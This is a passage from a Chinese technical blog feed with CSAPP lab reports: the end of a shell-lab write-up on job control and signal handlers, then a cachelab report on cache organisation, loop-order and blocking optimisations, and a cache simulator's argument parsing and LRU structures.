<span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> =</span> getjobpid(jobs, pid);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">        Sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        Sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line">        waitfg(pid);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>值得注意的事，在 <code>Fork</code> 前，父进程中屏蔽了 SIGCHLD 信号，这是为了避免出现子进程先结束（SIGCHLD 信号处理中调用 <code>deletejob</code>），再 <code>addjob</code> 的情况。这种情况下就使得作业管理出错。父进程中，在 <code>Fork</code> 之前就屏蔽了 SIGCHLD 信号，在 <code>addjob</code> 之后才恢复，就确保了作业被成功添加之后才可以被删除。<code>addjob</code> 前屏蔽所有信号，是为了避免 <code>printf</code> 并发冲突。</p>
<p>在子进程中，初始继承了父进程对于 SIGCHLD 的屏蔽，需要提前解除，避免子进程无法响应 SIGCHLD。</p>
<h2 id="do_bgfg">do_bgfg</h2>
<p>这个函数本身功能很简单，解析 jobid/pid，向<strong>进程组</strong>发送 SIGCONT 信号即可。但是 trace14 中测试了大量的边界情况，需要做参数校验，例如 pid 不存在时报错，pid 格式非法等。要健壮地判断边界代码量还是很大的，这里讨了个巧。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span>;</span></span><br><span class="line">    <span class="comment">// 参数校验</span></span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>] == <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s command requires PID or %%jobid argument\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">'%'</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(argv[<span class="number">1</span>][<span class="number">1</span>]))</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s: argument must be a PID or %%jobid\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">pid_t</span> jid = atoi(argv[<span class="number">1</span>] + <span class="number">1</span>);</span><br><span class="line">        job = getjobjid(jobs, jid);</span><br><span class="line">        <span class="keyword">if</span> (job == <span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s: No such job\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">isdigit</span>(argv[<span class="number">1</span>][<span class="number">0</span>]))</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s: argument must be a PID or %%jobid\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">pid_t</span> pid = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">        job = getjobpid(jobs, pid);</span><br><span class="line">        <span class="keyword">if</span> (job == <span class="literal">NULL</span>)</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"(%s): No such process\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], BG_CMD) == <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        job-&gt;state = BG;</span><br><span class="line">        Kill(-job-&gt;pid, SIGCONT);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, job-&gt;jid, job-&gt;pid, job-&gt;cmdline);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        job-&gt;state = FG;</span><br><span class="line">        Kill(-job-&gt;pid, SIGCONT);</span><br><span class="line">        waitfg(job-&gt;pid);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
<h2 id="sigchld_handler">sigchld_handler</h2>
<p>SIGCHLD 信号的处理。当子进程终止 / 被挂起时，会发送 SIGCHLD 给父进程。在父进程中，需要通过 <code>wait/waitpid</code> 回收已经结束的僵尸进程，避免空间浪费。这里不能无限地阻塞等待，会导致死锁。代码如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, prev_all;</span><br><span class="line">    Sigfillset(&amp;mask_all);</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">while</span> ((pid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all);</span><br><span class="line">        <span class="comment">// 正常终止, 回收</span></span><br><span class="line">        <span class="keyword">if</span> (WIFEXITED(status))</span><br><span class="line">        {</span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// 异常终止</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (WIFSIGNALED(status))</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) terminated by signal %d \n"</span>, pid2jid(pid), pid, WTERMSIG(status));</span><br><span class="line">            deletejob(jobs, pid);</span><br><span class="line">        }</span><br><span class="line">        <span class="comment">// 暂停挂起</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (WIFSTOPPED(status))</span><br><span class="line">        {</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) stopped by signal %d \n"</span>, pid2jid(pid), pid, WSTOPSIG(status));</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span> *<span class="title">job</span> =</span> getjobpid(jobs, pid);</span><br><span class="line">            job-&gt;state = ST;</span><br><span class="line">        }</span><br><span class="line">        Sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span> &amp;&amp; errno != ECHILD)</span><br><span class="line">    {</span><br><span class="line">        Sio_error(<span class="string">"waitpid error"</span>);</span><br><span class="line">    }</span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>其中，<code>WIFEXITED,WIFSIGNALED,WIFSTOPPED</code> 是定义在 <code>&lt;stdlib.h&gt;</code> 中的宏函数，用于判断子进程的结束原因，<code>WTERMSIG,WSTOPSIG</code> 用于获取对应的 signal。<code>WNOHANG,WUNTRACED</code> 两个 option 要求 waitpid 在没有结束子进程时立刻返回，有挂起子进程时也返回，这样就能够捕获到这些事件进行响应。核心的处理逻辑也屏蔽了其他信号，避免被打断。</p>
<h2 id="sigint_handler">sigint_handler</h2>
<p>将信号转发给前台进程组即可。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, prev_all;</span><br><span class="line">    Sigfillset(&amp;mask_all);</span><br><span class="line">    Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all);</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (pid)</span><br><span class="line">    {</span><br><span class="line">        Kill(-pid, SIGINT);</span><br><span class="line">    }</span><br><span class="line">    Sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="sigtstp_handler">sigtstp_handler</h2>
<p>将信号转发给前台进程组即可。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line">    <span class="keyword">sigset_t</span> mask_all, prev_all;</span><br><span class="line">    Sigfillset(&amp;mask_all);</span><br><span class="line">    Sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all);</span><br><span class="line">    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">    <span class="keyword">if</span> (pid)</span><br><span class="line">    {</span><br><span class="line">        Kill(-pid, SIGSTOP);</span><br><span class="line">    }</span><br><span class="line">    Sigprocmask(SIG_SETMASK, &amp;prev_all, <span class="literal">NULL</span>);</span><br><span class="line">    errno = olderrno;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://wdxtub.com/csapp/thin-csapp-5/2016/04/16/">【读薄 CSAPP】伍 异常控制流 | 小土刀 2.0 (wdxtub.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>体系结构</category>
        <category>csapp</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>体系结构</tag>
        <tag>csapp</tag>
        <tag>实验报告</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-Lab-4 实验报告: cachelab</title>
    <url>/blog/2023/12/17/CSAPP-Lab-4/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本文介绍了笔者在做 cachelab 一节的实验报告。该 lab 要求使用 C 语言实现 cache memory 的映射淘汰逻辑，并通过分块处理减少代码中的 cache miss。 <span id="more"></span></p>
<h2 id="理论知识">理论知识</h2>
<h3 id="cache">cache</h3>
<p>cache，即缓存，既是一种思想，也是计算机体系结构里的一块内存。前者大家很熟悉了，通过缓存耗时操作结果来降低延时，例如 redis 就是常用的缓存中间件。后者的话，处于寄存器与主存之间的高速存储，常分为 L1、L2、L3 三级，用于提供热点数据的快速访问，这也是本文 cache 的涵义。</p>
<p>cache 希望达到的目标有两个：</p>
<ul>
<li><strong>充分利用存储空间</strong>：减少不必要的 cache 淘汰，提高命中率</li>
<li><strong>快速查找</strong>：查找地址在 cache 中的速度要尽可能快，因为这是很基础的功能</li>
</ul>
<p>cache 的核心问题是，内存地址与 cache 存储间的映射关系是怎样的，常有以下几种组织形式：</p>
<ul>
<li>全相联（Fully Associative）：一个内存地址都可以存储在 cache 任意位置
<ul>
<li>优点：充分利用存储空间</li>
<li>缺点：查找效率差，O (n)，n 为 cache 条数</li>
</ul></li>
<li>直接映射（Direct Mapped）：一个内存地址被唯一映射到 cache 固定位置，例如取模
<ul>
<li>优点：查找效率高，O (1)</li>
<li> 缺点：不能充分利用空间</li>
</ul></li>
<li>组相联（Set Associative）：平衡两者优点，将 cache 分为若干个组，一个内存地址被唯一映射到一个组，组内全相连
<ul>
<li>优点：调整超参数（组的数量），可以取得存储和速度的均衡</li>
<li>缺点：超参数怎么调呢？</li>
</ul></li>
</ul>
<p>事实上，全相联和直接映射可以看做组相联的特例。cache 可以定义为一个三元组<span class="math inline"> \((S,E,B)\)</span>：有着<span class="math inline"> \(2^S\)</span> 个组，组内有<span class="math inline"> \(E\)</span> 条 cache，每条 cache 可以存放<span class="math inline"> \(2^B\)</span> 字节的数据。一个内存地址被拆分为标签段（tag）、组索引段（set index）与块内偏移（block offset）三部分。如下图所示。</p>
<p><img src="set_associative.png"></p>
<p>全相联可以看做<span class="math inline"> \(S=1\)</span> 的组相联，直接映射可以看做<span class="math inline"> \(E=1\)</span> 块的组相联。块是 cache 读写数据的最小单位，这意味着程序需要读取一个字节时，例如数组元素 A [0]，加载到 cache 的不仅是 A [0] 本身，而是以 A 开始的一整个块，包含 A [0]，A [1]... 这也是我们常说的预读。如果程序访问内存的模式满足这种模式，就能取得很好的<strong>空间局部性</strong>（temporal locality），提高缓存命中率，进而提升程序性能。反过来，如果不满足这种模式，就会损害性能。</p>
<p>一个典型的坏例子是二维数组的遍历，代码如下所示。在 C 语言中，二维数组是以行存储的一维数组。假设 cache 只能存储一个块，一个块可以包含 8 个 int，N&gt;8，下面的代码的行为是，访问 a [i][0]，加载 a [i][0]-a [i][7]，访问 a [i+1][0]，丢弃已有 cache，加载 a [i+1][0]-a [i+1][7]，访问 a [i+2][0]，丢弃已有 cache，加载 a [i+2][0]-a [i+2][7]。。。依次重复，可以看到，缓存的预读没有起到任何作用，每次读取都无法命中缓存，带来性能开销。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sumarraycols</span><span class="params">(<span class="keyword">int</span> a[M][N])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i, j, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; N; j++)</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; M; i++)</span><br><span class="line">        	sum += a[i][j];</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>如果交换两个循环的顺序，代码变为：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sumarraycols</span><span class="params">(<span class="keyword">int</span> a[M][N])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i, j, sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; M; i++)</span><br><span class="line">    	<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; N; j++)</span><br><span class="line">        	sum += a[i][j];</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>就可以很大程度提升局部性，代码的行为是，访问 a [i][0]，加载 a [i][0]-a [i][7]，访问 a [i][1]-a [i][7]，均命中缓存，访问 a [i][8]，丢弃缓存，加载 a [i][8]-a [i][15]。。。缓存命中率大大提高，由 0 变为 7/8。</p>
<h3 id="矩阵乘法的优化">矩阵乘法的优化</h3>
<p>上述思路也可以用于优化矩阵乘法。n*n 两矩阵乘法的简单代码为：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++) {</span><br><span class="line">        sum = <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">            sum += A[i][k]*B[k][j];</span><br><span class="line">        C[i][j] += sum;</span><br><span class="line">	}</span><br></pre></td></tr></tbody></table></figure>
<p>可以看到，A 的访问模式是满足步长为 1 的空间局部性的，缓存命中率高，而 B 的访问模式满足步长为 n 的局部性，命中率差。这里我们只关心最内层循环，假设一个块为 32 Bytes，元素为 double 占 8 Bytes，即一个块可以存储 4 个元素。那么，最内层循环中，A 的缓存失效率为 0.25，B 的缓存失效率为 1。</p>
<p>交换三层循环的顺序，可以带来缓存命中率的收益。三层循环共有 6 种顺序，上面的顺序是 ijk，将它交换为 jik 结果不变。</p>
<p>如果变为 jki 或 kj，性能会变得更差，jki 代码如下。最内层循环中，C 的缓存失效率为 1，A 的缓存失效率为 1。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n; k++) {</span><br><span class="line">        r = B[k][j];</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        	C[i][j] += A[i][k]*r;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
<p>如果变为 jki 或 kj，性能会达到最好，kij 代码如下。最内层循环中，C 的缓存失效率为 0.25，B 的缓存失效率为 0.25。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) {</span><br><span class="line">        r = A[i][k];</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        	C[i][j] += r*B[k][j];</span><br><span class="line">	}</span><br></pre></td></tr></tbody></table></figure>
<p>整理可以得到如下表格。</p>
<p><img src="matrix_multi.png"></p>
<h3 id="分块优化">分块优化</h3>
<p>上面的做法带来的命中率的提升，但仍有优化的空间。优化的思想是对矩阵进行分块，来进一步提升局部性。它的思想是尽量最大化一个块数据的用处。分析上面的代码可以发现，一个块被加载到 cache 之后，例如 B，每个元素只参与了一次运算，就会被逐出。当 C 的索引发生变化时，会再次需要加载同样的块进来，这带来了开销。根本原因在于，是在元素这个维度进行的运算，而不是块的维度。</p>
<p>代码如下所示</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bijk</span><span class="params">(<span class="built_in">array</span> A, <span class="built_in">array</span> B, <span class="built_in">array</span> C, <span class="keyword">int</span> n, <span class="keyword">int</span> bsize)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">int</span> i, j, k, kk, jj;</span><br><span class="line">    <span class="keyword">double</span> sum;</span><br><span class="line">    <span class="keyword">int</span> en = bsize * (n / bsize); <span class="comment">/* Amount that fits evenly into blocks */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            C[i][j] = <span class="number">0.0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (kk = <span class="number">0</span>; kk &lt; en; kk += bsize)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">for</span> (jj = <span class="number">0</span>; jj &lt; en; jj += bsize)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">for</span> (j = jj; j &lt; jj + bsize; j++)</span><br><span class="line">                {</span><br><span class="line">                    sum = C[i][j];</span><br><span class="line">                    <span class="keyword">for</span> (k = kk; k &lt; kk + bsize; k++)</span><br><span class="line">                    {</span><br><span class="line">                        sum += A[i][k] * B[k][j];</span><br><span class="line">                    }</span><br><span class="line">                    C[i][j] = sum;</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>访问模式如下图所示，每次从 A 选出一条 1*bsize 的行，与 B 中 bsize*bsize 的块进行乘法，叠加在 1*bsize 的 C 切片上。</p>
<p><img src="matrix_multi_blocking.png"></p>
<p>性能结果如下图所示。可以看出，当矩阵大时，分块可以带来显著的收益。而矩阵小时，分块带来的额外运算成本就不能忽略了。</p>
<p><img src="matrix_multi_results.png"></p>
<h2 id="cache-simulator">cache simulator</h2>
<p>本节要求我们模拟任意的<span class="math inline"> \((S,E,B)\)</span> 的 cache 逻辑，并支持命令行传入参数，读入 trace 文件得到 cache hit、miss、eviction 的结果。分析可以发现，工作分为两部分：</p>
<ul>
<li>支持命令行参数和 trace 文件解析</li>
<li>基于 lru 的 cache</li>
</ul>
<h3 id="命令行参数">命令行参数</h3>
<p>虽然 C 自带的 main 签名 <code>int main(int argc,char **argv)</code> 就可以用于解析命令行参数，但对于参数传值有些过于简陋了，指导书建议我们使用 <code>getopt</code> 函数，介绍可以详见 <a href="https://www.cnblogs.com/qingergege/p/5914218.html">Linux 下 getopt () 函数的简单使用 - 青儿哥哥 - 博客园 (cnblogs.com)</a>。getopt 函数原型如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getopt</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> * <span class="keyword">const</span> argv[ ],<span class="keyword">const</span> <span class="keyword">char</span> * optstring)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<p>前两个参数来自 main 的签名，最后一个是以冒号分割的选项字符串，表示参数的模式，冒号表示必须传参。命令行参数解析代码如下，使用 <code>atoi</code> 函数将字符串转为整型，<code>extern char *optarg;</code> 是一个保存了参数值的全局变量。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> opt;</span><br><span class="line"><span class="keyword">int</span> s, E, b;</span><br><span class="line"><span class="keyword">char</span> *tracefile;</span><br><span class="line"><span class="keyword">int</span> verbose_flag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ((opt = getopt(argc, argv, <span class="string">"hvs:E:b:t:"</span>)) != <span class="number">-1</span>)</span><br><span class="line">{</span><br><span class="line">    <span class="keyword">switch</span> (opt)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'h'</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Usage: %s [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'v'</span>:</span><br><span class="line">            verbose_flag = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">            s = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'E'</span>:</span><br><span class="line">            E = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'b'</span>:</span><br><span class="line">            b = atoi(optarg);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'t'</span>:</span><br><span class="line">            tracefile = optarg;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Usage: %s [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="trace解析">trace 解析</h3>
<p>这一部分比较简单，读入文件后，根据首字母过滤掉以 <code>I</code> 开头的指令访问，使用 <code>strtoull</code> 函数将字符串转为 <code>unsigned long long</code> 的 64 位地址。由于指导书说保证地址对齐，因此可以忽略掉 trace 中的 <code>size</code> 字段，对 trace 每一行，构造如下的 cache 访问对象。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CacheVisit</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> address;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="comment">// 1 L, 2 M, 3 S</span></span><br><span class="line">    <span class="keyword">int</span> op;</span><br><span class="line">} CacheVisit;</span><br></pre></td></tr></tbody></table></figure>
<h3 id="lru-cache">lru cache</h3>
<p>刷 LeetCode 的同学都知道，可以用双向链表 + hash 实现一个 O (1) 的 lru cache。但在 cache memory 里，这种方法会浪费很多空间，由于一个 Set 里的 cache line 数量有限，直接暴力查找淘汰性能也不会太差。我这里是只使用了双向链表，按访问时间顺序排列，头部插入，尾部淘汰。也可以使用数组保存，或者 cache line 保存时间戳等。</p>
<p>为了高内聚低耦合，我设计了单独的 <code>cache.h, cache.c</code> 来存放相关代码。<code>cache.h</code> 中声明结构体对象和暴露必要的函数。代码如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOAD 1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODIFY 2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STORE 3</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CacheLine</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> tag;</span><br><span class="line">    <span class="keyword">short</span> valid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CacheLine</span> *<span class="title">prev</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">CacheLine</span> *<span class="title">next</span>;</span></span><br><span class="line">} CacheLine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CacheSet</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="keyword">int</span> associativity;</span><br><span class="line">    <span class="keyword">int</span> blockSize;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line">    CacheLine *head;</span><br><span class="line">    CacheLine *tail;</span><br><span class="line">} CacheSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CacheResult</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="keyword">int</span> miss;</span><br><span class="line">    <span class="keyword">int</span> hit;</span><br><span class="line">    <span class="keyword">int</span> eviction;</span><br><span class="line">} CacheResult;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CacheVisit</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> address;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="comment">// 1 L, 2 M, 3 S</span></span><br><span class="line">    <span class="keyword">int</span> op;</span><br><span class="line">} CacheVisit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Cache</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    CacheSet **sets;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line">    <span class="keyword">int</span> b;</span><br><span class="line">} Cache;</span><br><span class="line"></span><br><span class="line"><span class="function">Cache *<span class="title">newCache</span><span class="params">(<span class="keyword">int</span> s, <span class="keyword">int</span> E, <span class="keyword">int</span> b)</span></span>;</span><br><span class="line"><span class="function">CacheResult <span class="title">fetch</span><span class="params">(Cache *cache, CacheVisit *visit)</span></span>;</span><br></pre></td></tr></tbody></table></figure>
<p>这里我们并不关心 cache 存放的数据，因此 <code>CacheResult</code> 中只需要存储 miss、hit 和 eviction 的数量即可。cache 模块只需要向外暴露构造方法和访问方法即可，遵循最小原则。</p>
<p>在 <code>cache.c</code> 中，实现这些函数的功能，代码如下：</p>
